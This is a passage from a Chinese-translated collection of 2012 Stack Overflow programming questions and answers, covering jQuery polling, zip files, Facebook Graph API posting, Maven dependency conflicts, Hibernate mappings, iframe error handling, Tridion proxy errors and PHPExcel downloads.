[https://developer.mozilla.org/en-US/docs/DOM/DOM_event_reference?redirectlocale=en-US&redirectslug=DOM_Events](https://developer.mozilla.org/en-US/docs/DOM/DOM_event_reference?redirectlocale=en-US&redirectslug=DOM_Events)

[http://www.w3.org/TR/DOM-Level-3-Events/#events-MutationEvent](http://www.w3.org/TR/DOM-Level-3-Events/#events-MutationEvent)

*免责声明*：仅在 Mozilla Firefox 中测试！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T13:08:43.653

也许您可以使用间隔来处理此类事件：

```
function checkIt () {
    if ($('#Element').length > 0) {
        if($('#Element').is(':hidden') == true) {
           // add class name
            alert('Element was hidden');
            $('#Element').removeClass('hidden').addClass('visible');

            // or toggle class name
            //$('#Element').toggleClass('className');

            // or remove class name
            //$('#Element').removeClass('className');

            // if you want to clear the interval
            //clearInterval(listenerID);
        }
    }
}

var listenerID;
$(function(){
    listenerID = setInterval(checkIt, 500);
}); 
```

[http://jsfiddle.net/KFGrL/2/](http://jsfiddle.net/KFGrL/2/)

检查元素是否有类名：

```
if ($('#Element').hasClass('className')) {
    // your code
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-06T12:39:11.610

没有您可以订阅的此类活动。你能做的最好的就是定期运行你自己的函数来检查你关心的变化。*

# java - 将随机访问文件透明地写入 zip 文件

> ID：12300233
> 
> 赞同：1
> 
> 时间：2012-09-06T12:33:24.257
> 
> 标签：java, zip, random-access

我有一个将 RandomAccessFile 写入文件系统的 java 应用程序。它必须是 RAF，因为有些事情直到最后才知道，然后我会在文件开头回溯并写入一些信息。

我想以某种方式将文件放入 zip 存档中。我想我可以在最后这样做，但这将涉及复制到目前为止已写入的所有数据。由于这些文件可能会变得非常大，因此我更喜欢一种不涉及复制数据的方式。

有没有办法获得类似“ZipRandomAccessFile”的东西，比如 jdk 中可用的 ZipOutputStream？

它不必只是 jdk，我不介意使用第三方库来完成工作。

任何想法或建议..？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T13:13:52.457

也许您需要更改文件格式以便可以按顺序写入。

事实上，由于它是一个 Zip 并且 Zip 可以包含多个条目，因此您可以将顺序数据写入一个`ZipEntry`，而将“仅在完成时”已知的数据写入一个单独的`ZipEntry`- 这提供了两全其美的效果。

它很容易编写，不必回到大顺序块的开头。它很容易阅读——如果消费者在阅读更大的资源之前需要知道“标题”数据，他们可以在继续之前阅读该 zip 条目中的数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T12:48:39.377

指定 DEFLATE 格式的方式，只有从头开始阅读才有意义。因此，每次您来回寻找时，底层的 zip 实现都必须从头开始读取文件。如果您修改某些内容，则必须首先解压缩整个文件（不仅仅是到修改点），将更改应用于解压缩的数据，然后再次压缩整个文件。

总而言之，ZIP/DEFLATE 不是这种格式。但是，将您的数据分解成更小的、固定大小的文件并单独压缩可能是可行的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-06T13:36:04.887

压缩的重点是识别数据中的冗余（例如一些更频繁出现的字符或重复模式），并通过在没有冗余的情况下对其进行编码来使数据更小。这使得创建允许随机访问写入的压缩算法变得不可行。尤其：

*   您永远不会事先知道一条数据可以被压缩到什么程度。因此，如果您更改某些数据块，其压缩版本很可能会更长或更短。
*   作为一种压缩算法处理数据流，它使用迄今为止积累的知识（如发现的重复模式）在其当前位置压缩数据。因此，如果您更改某些内容，则算法需要重新压缩从更改到结束的所有内容。

所以唯一合理的解决方案是操作数据并在最后一次压缩它。

# php - 如何在不登录 php 帐户的情况下将故事发布到 Facebook 页面？

> ID：12300234
> 
> 赞同：0
> 
> 时间：2012-09-06T12:33:47.467
> 
> 标签：php, facebook

```
 <?php
          session_start();

         $appid = 'xxxxxxxx'; //Application ID
        $appsec = 'xxxxx'; // Application secret
    $redirectUrl = 'http://test/tester/'; //Facebook redirects back to this page
    $permissions = 'publish_stream,offline_access,read_stream,manage_pages'; // Permissions we will need
    $access_token = '';

    if(isset($_POST['FacebookPageID']) && strlen($_POST['FacebookPageID'])>10)
    {

$_SESSION['FacebookPageID']=$_POST['FacebookPageID'];
$_SESSION['FacebookMessage']=$_POST['FacebookMessage'];
 $_SESSION['Facebooktitle']=$_POST['Facebooktitle'];
 // $_SESSION['image']=$_POST['image'];
}

if(!is_numeric($_SESSION['FacebookPageID']) || strlen($_SESSION['FacebookPageID'])<5)
{
 session_destroy();
die("<meta http-equiv=\"refresh\" content=\"2;URL=".$redirectUrl."\" />");
}
else
{

if(!isset($_GET["code"]))
{

     $_SESSION['state'] = md5(uniqid(rand(), TRUE));

     $RedirectToFacebook = "https://www.facebook.com/dialog/oauth?client_id=".$appid;
        $RedirectToFacebook .="&redirect_uri=".urlencode($redirectUrl.'process.php');
     $RedirectToFacebook .="&state=".$_SESSION['state'];

  die("<script type=\"text/javascript\">top.location.href='" . $RedirectToFacebook . "';</script>
  <noscript><a href='".$RedirectToFacebook."'>Needs Permissioins</a></noscript>");
}
else
{

############## Facebook Page ID ############
$facebookPageID = $_SESSION['FacebookPageID'];
//$target_path   = $_SESSION['image'];

 ############## Wall Message ############
$facebookMessage = (empty($_SESSION['FacebookMessage']) || strlen($_SESSION['FacebookMessage'])<5)?"Nice Facebook Wall Posting Script!":$_SESSION['FacebookMessage'];

if($_GET['state'] == $_SESSION['state'])
{
$AccessTokenUrl = "https://graph.facebook.com/oauth/access_token?client_id=".$appid;
$AccessTokenUrl .="&redirect_uri=".urlencode($redirectUrl.'process.php');
$AccessTokenUrl .="&client_secret=".$appsec;
$AccessTokenUrl .="&code=".$_GET["code"];

 $ReturnedString = file_get_contents($AccessTokenUrl);
 $params=null;
 parse_str($ReturnedString, $params);
$OurAccessToken = $params['access_token']; //access token

 //---------------
require_once('src/facebook.php' ); //Include our facebook Php Sdk

$post_url = '/'.$facebookPageID.'/feed';
$facebook = new Facebook(array(
'appId' => $appid,
    'secret' => $appsec,
 ));

 //the Posting Parameters
    $PostData = array(
    'message' => 'uffcaffnews.com',
 'name' => $Facebooktitle,
 'caption' => "test.fff.com",
 'link' => 'http://www.fff.com/assets/ajax-post-on-page-wall',
'description' => $facebookMessage,
    'picture' => "http://test.c/images/desc.jpg",
'access_token' =>$OurAccessToken,
'actions' => array(
array(
'name' => 'Saaraan',
'link' => 'http://www.saaraan.com'
)
 )
 );

try {

$pageID = '3xxx';
$result = $facebook->api($post_url, 'post', $PostData);

     if($result)
{
 session_destroy();
     echo 'Done..';
 die("<meta http-equiv=\"refresh\" content=\"2;URL=".$redirectUrl."?");
 }
} 
```

我想在不登录 Facebook 帐户的情况下从我的网站管理员将故事发布到 Facebook 页面。请帮助我想从我的网站管理员将故事发布到 Facebook 页面而不登录到 Facebook 帐户。请帮助我

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T12:39:47.343

您无需`offline_access`获得向 Facebook 发布内容的权限。只`publish_stream`需要许可。

即使不需要用户登录。一旦用户授权您的应用程序`publish_stream`，您就可以开始代表他发布内容，*而无需*他登录！

你可以参考[这里](http://www.masteringapi.com/tutorials/how-to-post-a-message-on-the-user-wall-using-facebook-graph-api/33/)。

# gwt - gwt arquillian webdriver 测试不运行

> ID：12300236
> 
> 赞同：1
> 
> 时间：2012-09-06T12:33:49.503
> 
> 标签：gwt, maven, selenium, webdriver, jboss-arquillian

我尝试编写一个简单的演示测试用例，以试用 arquillian webdriver。

我的 pom 看起来像：

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd">
    <parent>
        <groupId>de.telekom.csc</groupId>
        <artifactId>csc0700</artifactId>
        <version>1.0-SNAPSHOT</version>
        <relativePath>../pom.xml</relativePath>
    </parent>

  <!-- POM file generated with GWT webAppCreator -->
  <modelVersion>4.0.0</modelVersion>
  <artifactId>csc0700-test</artifactId>
  <packaging>jar</packaging>
  <name>Csc0700Test</name>

  <prerequisites>
    <maven>3.0</maven>
  </prerequisites>

  <properties>
    <arquillianVersion>1.0.2.Final</arquillianVersion>
  </properties>

  <dependencies>
    <dependency>
      <groupId>log4j</groupId>
      <artifactId>log4j</artifactId>
      <version>1.2.17</version>
    </dependency>
    <dependency>
      <groupId>org.slf4j</groupId>
      <artifactId>slf4j-log4j12</artifactId>
      <version>1.6.6</version>
    </dependency>
    <dependency>
      <groupId>junit</groupId>
      <artifactId>junit</artifactId>
      <version>4.10</version>
      <scope>test</scope>
    </dependency>
    <dependency>
      <groupId>org.jboss.shrinkwrap.resolver</groupId>
      <artifactId>shrinkwrap-resolver-impl-maven</artifactId>
      <version>2.0.0-alpha-1</version>
      <scope>test</scope>
    </dependency>
    <dependency>
      <groupId>org.jboss.arquillian.container</groupId>
      <artifactId>arquillian-container-spi</artifactId>
      <scope>test</scope>
    </dependency>
    <dependency>
      <groupId>org.jboss.arquillian.protocol</groupId>
      <artifactId>arquillian-protocol-servlet</artifactId>
      <scope>test</scope>
    </dependency>
    <dependency>
      <groupId>org.jboss.arquillian.testenricher</groupId>
      <artifactId>arquillian-testenricher-cdi</artifactId>
      <scope>test</scope>
    </dependency>
    <dependency>
      <groupId>org.jboss.arquillian.junit</groupId>
      <artifactId>arquillian-junit-standalone</artifactId>
      <scope>test</scope>
    </dependency>
    <dependency> 
       <groupId>org.jboss.arquillian.extension</groupId>
       <artifactId>arquillian-drone-webdriver-depchain</artifactId>
       <version>1.0.0.Final</version>
       <type>pom</type>
       <scope>test</scope>
     </dependency>
    <dependency>
      <groupId>org.eclipse.jetty</groupId>
      <artifactId>jetty-webapp</artifactId>
      <version>8.1.5.v20120716</version>
      <scope>test</scope>
    </dependency>
    <dependency>
      <groupId>org.eclipse.jetty</groupId>
      <artifactId>jetty-plus</artifactId>
      <version>8.1.5.v20120716</version>
      <scope>test</scope>
    </dependency>
<!--    <dependency>
      <groupId>de.telekom.csc</groupId>
      <artifactId>csc0700-web</artifactId>
      <version>1.0-SNAPSHOT</version>
      <type>war</type>
      <scope>system</scope>
    </dependency> -->
  </dependencies>
  <dependencyManagement>
    <dependencies>
      <dependency>
        <groupId>org.jboss.shrinkwrap.resolver</groupId>
        <artifactId>shrinkwrap-resolver-bom</artifactId>
        <version>2.0.0-alpha-1</version>
        <scope>import</scope>
        <type>pom</type>
      </dependency>
      <dependency>
        <groupId>org.jboss.arquillian</groupId>
        <artifactId>arquillian-bom</artifactId>
        <version>${arquillianVersion}</version>
        <type>pom</type>
        <scope>import</scope>
      </dependency>
      <dependency>
        <groupId>org.jboss.arquillian.extension</groupId>
        <artifactId>arquillian-drone-bom</artifactId>
        <!-- <version>1.1.0.CR2</version> -->
        <version>1.0.0.Final</version>
        <type>pom</type>
        <scope>import</scope>
      </dependency>    
    </dependencies>
  </dependencyManagement>

  <build>
    <plugins>
      <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-compiler-plugin</artifactId>
        <version>2.5.1</version>
        <configuration>
          <source>1.6</source>
          <target>1.6</target>
        </configuration>
      </plugin>
      <plugin>
        <artifactId>maven-failsafe-plugin</artifactId>
        <version>2.6</version>
        <configuration>
          <skipTests>true</skipTests>
        </configuration>
        <executions>
          <execution>
            <goals>
              <goal>integration-test</goal>
              <goal>verify</goal>
            </goals>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
</project> 
```

运行测试用例时，出现异常：

```
java.lang.NoSuchMethodError: org.apache.http.conn.scheme.Scheme.<init>(Ljava/lang/String;ILorg/apache/http/conn/scheme/SchemeSocketFactory;)V
    at org.openqa.selenium.remote.internal.HttpClientFactory.getClientConnectionManager(HttpClientFactory.java:64)
    at org.openqa.selenium.remote.internal.HttpClientFactory.<init>(HttpClientFactory.java:50)
    at org.openqa.selenium.remote.HttpCommandExecutor.<init>(HttpCommandExecutor.java:111)
    at org.openqa.selenium.remote.RemoteWebDriver.<init>(RemoteWebDriver.java:102)
    at de.telekom.csc.MainIT.createDriver(MainIT.java:59)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:45)
    at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:15)
    at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:42)
    at org.junit.internal.runners.statements.RunBefores.evaluate(RunBefores.java:27)
    at org.jboss.arquillian.junit.Arquillian$StatementLifecycleExecutor.invoke(Arquillian.java:351)
    at org.jboss.arquillian.container.test.impl.execution.ClientBeforeAfterLifecycleEventExecuter.execute(ClientBeforeAfterLifecycleEventExecuter.java:99)
    at org.jboss.arquillian.container.test.impl.execution.ClientBeforeAfterLifecycleEventExecuter.on(ClientBeforeAfterLifecycleEventExecuter.java:72)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.jboss.arquillian.core.impl.ObserverImpl.invoke(ObserverImpl.java:94)
    at org.jboss.arquillian.core.impl.EventContextImpl.invokeObservers(EventContextImpl.java:99)
    at org.jboss.arquillian.core.impl.EventContextImpl.proceed(EventContextImpl.java:81)
    at org.jboss.arquillian.container.test.impl.client.ContainerEventController.createContext(ContainerEventController.java:142)
    at org.jboss.arquillian.container.test.impl.client.ContainerEventController.createBeforeContext(ContainerEventController.java:124)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.jboss.arquillian.core.impl.ObserverImpl.invoke(ObserverImpl.java:94)
    at org.jboss.arquillian.core.impl.EventContextImpl.proceed(EventContextImpl.java:88)
    at org.jboss.arquillian.test.impl.TestContextHandler.createTestContext(TestContextHandler.java:89)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.jboss.arquillian.core.impl.ObserverImpl.invoke(ObserverImpl.java:94)
    at org.jboss.arquillian.core.impl.EventContextImpl.proceed(EventContextImpl.java:88)
    at org.jboss.arquillian.test.impl.TestContextHandler.createClassContext(TestContextHandler.java:75)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.jboss.arquillian.core.impl.ObserverImpl.invoke(ObserverImpl.java:94)
    at org.jboss.arquillian.core.impl.EventContextImpl.proceed(EventContextImpl.java:88)
    at org.jboss.arquillian.test.impl.TestContextHandler.createSuiteContext(TestContextHandler.java:60)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.jboss.arquillian.core.impl.ObserverImpl.invoke(ObserverImpl.java:94)
    at org.jboss.arquillian.core.impl.EventContextImpl.proceed(EventContextImpl.java:88)
    at org.jboss.arquillian.core.impl.ManagerImpl.fire(ManagerImpl.java:135)
    at org.jboss.arquillian.core.impl.ManagerImpl.fire(ManagerImpl.java:115)
    at org.jboss.arquillian.test.impl.EventTestRunnerAdaptor.before(EventTestRunnerAdaptor.java:95)
    at org.jboss.arquillian.junit.Arquillian$4.evaluate(Arquillian.java:222)
    at org.jboss.arquillian.junit.Arquillian.multiExecute(Arquillian.java:314)
    at org.jboss.arquillian.junit.Arquillian.access$100(Arquillian.java:46)
    at org.jboss.arquillian.junit.Arquillian$5.evaluate(Arquillian.java:240)
    at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:263)
    at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:68)
    at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:47)
    at org.junit.runners.ParentRunner$3.run(ParentRunner.java:231)
    at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:60)
    at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:229)
    at org.junit.runners.ParentRunner.access$000(ParentRunner.java:50)
    at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:222)
    at org.jboss.arquillian.junit.Arquillian$2.evaluate(Arquillian.java:185)
    at org.jboss.arquillian.junit.Arquillian.multiExecute(Arquillian.java:314)
    at org.jboss.arquillian.junit.Arquillian.access$100(Arquillian.java:46)
    at org.jboss.arquillian.junit.Arquillian$3.evaluate(Arquillian.java:199)
    at org.junit.runners.ParentRunner.run(ParentRunner.java:300)
    at org.jboss.arquillian.junit.Arquillian.run(Arquillian.java:147)
    at org.eclipse.jdt.internal.junit4.runner.JUnit4TestReference.run(JUnit4TestReference.java:50)
    at org.eclipse.jdt.internal.junit.runner.TestExecution.run(TestExecution.java:38)
    at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:467)
    at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:683)
    at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.run(RemoteTestRunner.java:390)
    at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.main(RemoteTestRunner.java:197) 
```

这似乎是由于 http-client 中的版本冲突，但调用：

```
$ mvn dependency:tree -Dverbose  | grep client 
```

只返回一个版本：org.apache.httpcomponents:httpclient 4.1.2

我被困在这几天了。有没有人有版本的工作组合？或者，是否有一种通用的方法来解决 Maven 的这些问题？

谷歌搜索异常行似乎表明不少人遇到同样的问题，但我找不到满意的答案。此外，此信息似乎很快就会过时。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T13:29:48.780

`com.google.gwt:gwt-dev` *包含*自己的（旧）版本的 Apache HttpClient；这就是为什么建议不要将它包含在您的类路径中和/或将您的 GWT 客户端代码和服务器代码分开在单独的 Maven 模块中的原因。

如果您无法轻松修复依赖关系，那么您应该能够在*中间工件中使用*[JarJar Maven 插件](http://sonatype.github.com/jarjar-maven-plugin/)或[maven-share-plugin](http://maven.apache.org/plugins/maven-shade-plugin/)来重新定位有问题的类。

 *请参阅[http://code.google.com/p/google-web-toolkit/issues/detail?id=4484](http://code.google.com/p/google-web-toolkit/issues/detail?id=4484)*

# php - Fontis Australia Magento Extension 已从管理员端启用，但未显示在运输方式中

> ID：12300237
> 
> 赞同：0
> 
> 时间：2012-09-06T12:33:49.663
> 
> 标签：php, magento

我成功安装了“Fontis Australia Magento Extension”，然后启用了该扩展并从管理员端填写了必填字段，但在前端它没有显示在运输方式部分。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T23:58:19.927

不幸的是，它可能没有出现的原因有很多。我们在网站上的说明中列出了一些常见的：

[http://www.fontis.com.au/magento/extensions/australia](http://www.fontis.com.au/magento/extensions/australia)

您可能还想按照上面的建议尝试清除缓存，并检查您的自定义模板或布局是否没有导致冲突。Magento 有时会遇到的另一件事是对 var/ 目录的权限不正确，这可能会导致各种奇怪的行为。

# java - 级联和逆的使用

> ID：12300239
> 
> 赞同：0
> 
> 时间：2012-09-06T12:33:54.270
> 
> 标签：java, hibernate, jakarta-ee, hibernate-mapping

我在这里读到[休眠中的级联和反向有什么区别，它们用于什么？](https://stackoverflow.com/q/3667387/1564528)那

“在通过中间表的多对多关系的情况下；“级联”表示是否将在子表中创建/更新记录。而“反向”表示是否将在中间表中创建/更新记录”

并且解释非常好，我明白了..但这是多对多的情况。在一对多和多一关系？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T10:19:42.760

在一对多关系的情况下：

*   “级联”表示操作（保存/更新/删除/刷新...）是否也会在子级上调用
*   “逆”表示外键列是否将由包含集合的实体设置/更新。Inverse="true" 假定子对象具有反向引用，并且子对象在保存/更新时将设置/更新外键列

# javascript - 动态创建的 iframe 中的 window.onerror 在 lne 0 处给出脚本错误

> ID：12300242
> 
> 赞同：1
> 
> 时间：2012-09-06T12:34:04.190
> 
> 标签：javascript, iframe

我将 iframe 的源设置为 html 字符串，如下所示，让它执行我存储在内存中的 html 字符串。

```
window.sHTML = html;
iframe.src = 'javascript:parent.sHTML'; 
```

html 字符串包含这样的 javascript 代码：

```
window.onerror = function(a,b,c) {
  console.log(a);
  console.log(b);
  console.log(c)
  return true;
} 
```

当 iframe 中发生错误时，它会记录“脚本错误”、“”、“0”，而不是给我实际的错误信息。

我知道当有问题的 iframe 是跨域时会发生这种情况：[隐秘的“脚本错误”。在 Chrome 和 Firefox 中以 Javascript 报告](https://stackoverflow.com/questions/5913978/cryptic-script-error-reported-in-javascript-in-chrome-and-firefox)

但是，iframe 不是跨域的，它只是我动态创建的。有没有办法让 window.onerror 将其视为非跨域 iframe，以便我可以从 window.onerror 访问正确的错误信息？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T13:16:57.327

如果您需要使用 HTML 字符串动态填充 iframe 内容，`document.write`可能会起作用：

```
var iframe = document.createElement('iframe');

document.body.appendChild(iframe);

iframe.contentDocument.open();
iframe.contentDocument.write(yourHTMLString);
iframe.contentDocument.close(); 
```

[参考](http://softwareas.com/injecting-html-into-an-iframe)

# javascript - jqGrid 显示从搜索对话框到主窗体的搜索条件

> ID：12300248
> 
> 赞同：1
> 
> 时间：2012-09-06T12:34:55.627
> 
> 标签：javascript, jqgrid-asp.net

我有一个使用多重搜索的 jqgrid。我想在将 jqgrid 托管为标题的表单上显示搜索条件。是否可以在搜索对话框和托管网格的表单之间传递数据？

[如何获取 jqGrid 当前搜索条件](https://stackoverflow.com/questions/6217499/how-to-get-jqgrid-current-search-criteria)尚不清楚该条件是显示在搜索对话框还是主机表单上。

# tridion - 远程服务器返回意外响应：(407) 需要代理授权

> ID：12300249
> 
> 赞同：0
> 
> 时间：2012-09-06T12:34:57.037
> 
> 标签：tridion, tridion-2011

我正在尝试连接到提供特定用户凭据的核心服务，但有时我会收到代理 407 错误（如本问题的标题所述），此自动在 10-15 分钟后得到解决，然后我能够再次连接到核心服务。这个问题有永久的解决方案吗？我知道这是一个简单的问题，但我不能将凭据作为 System.Net.CredentialCache.DefaultCredentials；或作为网络上可用的其他解决方案。下面是我连接到核心服务的代码，即使我在每次操作后调用 client.Close() 也会出现这个问题。

```
core_service.ServiceReference1.SessionAwareCoreService2010Client client = new SessionAwareCoreService2010Client(); 
    client.ClientCredentials.Windows.ClientCredential.UserName = "myUserName"; 
    client.ClientCredentials.Windows.ClientCredential.Password = "myPassword"; client.Open();

 if (client.State == System.ServiceModel.CommunicationState.Opened)
            {
                // some code                } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T12:50:55.317

试试这个而不是“SessionAwareCoreService2010Client”使用“CoreService2010Client”

```
var objclient = new CoreService2010Client();
            objclient.ClientCredentials.Windows.ClientCredential.UserName = Generation.Settings.Username;
            objclient.ClientCredentials.Windows.ClientCredential.Password = Generation.Settings.Password;
            objclient.Open(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-06T13:01:07.413

有时在您使用 Fiddler 类型的 Web 调试工具时会发生这种情况。您可以尝试直接设置代理凭据以找出原因如下 -

```
request.Proxy = new WebProxy("proxyIp", 8080);
 request.Proxy.Credentials = CredentialCache.DefaultCredentials; 
```

注意：- 以上建议基于我的 .net 经验，而不是基于 tridion 核心服务。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-07T06:10:29.653

可能的解决方案是增加端点的超时时间我已经将超时时间从现有的 1 分钟更新为 15 分钟，下面是 app.config 的特定端点的代码

```
 <binding name="wsHttp_2010" closeTimeout="00:15:00" openTimeout="00:15:00"
                receiveTimeout="00:10:00" sendTimeout="00:15:00" bypassProxyOnLocal="false"
                transactionFlow="true" hostNameComparisonMode="StrongWildcard"
                maxBufferPoolSize="524288" maxReceivedMessageSize="65536"
                messageEncoding="Text" textEncoding="utf-8" useDefaultWebProxy="true"
                allowCookies="false"> 
```

让我们看看这是否可行，请建议我是否需要在配置文件中进行任何其他更改。

# php - PHP将excel数据流式传输到浏览器

> ID：12300251
> 
> 赞同：0
> 
> 时间：2012-09-06T12:35:07.280
> 
> 标签：php, internet-explorer, firefox, phpexcel

我正在通过 PHP Excel 生成 Excel 文档。用户要求将文件内容直接输出到浏览器。我写了以下代码（通过谷歌研究后）：

```
$writer = PHPExcel_IOFactory::createWriter($xcel, 'Excel5');

header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
header("Content-type: applicaton/vnd.ms-excel");
header("Content-type: application/force-download");
header("Content-type: application/octet-stream");
header("Content-type: application/download");;
header("Content-Disposition: attachment;filename=File.xlsx");
header("Expires: 0");
header("Pragma: public");
$writer->save('php://output'); 
```

结果如下：

> ��ࡱ�;������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ��������������������������������������������
> 
> ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ��������������������������������������������B�=�%r8X" 1��Calibri������������������������������������������������������������������ ����������������������������8���������������������������� ����3f������ff����������������������������������������̙ ��̙3f�3����������fff����3f3�f333�3�3f33�333� iD07_12_ACT_N��g���W&文件创建于 2012 年 9 月 6 日 - 14:19:28 � �*+������&ffffff�?'ffffff�?(�?)�?�"dXX333333�?333333�?U}$ � >�@gg������根条目�������� �F�ß:���ß:����工作簿��������������F���� ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ �</p>����工作簿������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������</p>����工作簿������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������������������������������������ ������������������������</p>

我没有将询问的内容输出为 excel 表，而是获取了 excel 表的编码内容。

谁能解决这个问题？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T13:13:05.950

如果要生成 xls (Excel5) 文件，请尝试以下操作：

```
 $writer = PHPExcel_IOFactory::createWriter($xcel, 'Excel5');    
    header('Content-Type: application/vnd.ms-excel');
    header("Content-Disposition: attachment;filename=File.xls");
    header('Cache-Control: max-age=0');
    $writer->save('php://output'); 
```

如果你想要一个 xlsx（对于 excel 2007 或更高版本）文件，试试这个：

```
 $writer = PHPExcel_IOFactory::createWriter($xcel, 'Excel2007');    
    header('Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
    header("Content-Disposition: attachment;filename=File.xlsx");
    header('Cache-Control: max-age=0');
    $writer->save('php://output'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T12:40:03.360

```
header('Content-Type: application/vnd.ms-excel');
header('Content-Disposition: attachment;filename="01simple.xls"');
header('Cache-Control: max-age=0'); 
```

对于大多数浏览器来说应该足够了（基于 SSL 的 IE 是一个例外）：/Tests/01simple-download-xls.php 工作吗？

在标题之前你有任何输出到浏览器吗？

# android - 在android中以固定时间间隔启动我的位置活动

> ID：12300256
> 
> 赞同：1
> 
> 时间：2012-09-06T12:35:32.747
> 
> 标签：android, android-activity, broadcastreceiver, alarmmanager

```
public class LocUpdator extends Activity implements LocationListener {

 private TextView latituteField;
  private TextView longitudeField;
  private LocationManager locationManager;
  private LocationManager service;
  private String provider;

/** Called when the activity is first created. */

  @Override
  public void onStart() {
    super.onStart();
    //setContentView(R.layout.main);

    // Get the location manager
    locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
    // Define the criteria how to select the locatioin provider -> use
    // default
    service = (LocationManager) getSystemService(LOCATION_SERVICE);
    boolean enabled = service.isProviderEnabled(LocationManager.GPS_PROVIDER);

            // Check if enabled and if not send user to the GSP settings
            // Better solution would be to display a dialog and suggesting to 
            // go to the settings
            if (!enabled) {
              Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
              startActivity(intent);
            } 
    Criteria criteria = new Criteria();
    //criteria.setAccuracy(Criteria.ACCURACY_FINE);
    //criteria.setPowerRequirement(Criteria.POWER_MEDIUM);
    provider = locationManager.getBestProvider(criteria,true);
    Location location = locationManager.getLastKnownLocation(provider);

    // Initialize the location fields
    if (location != null) {
      System.out.println("Provider " + provider + " has been selected.");
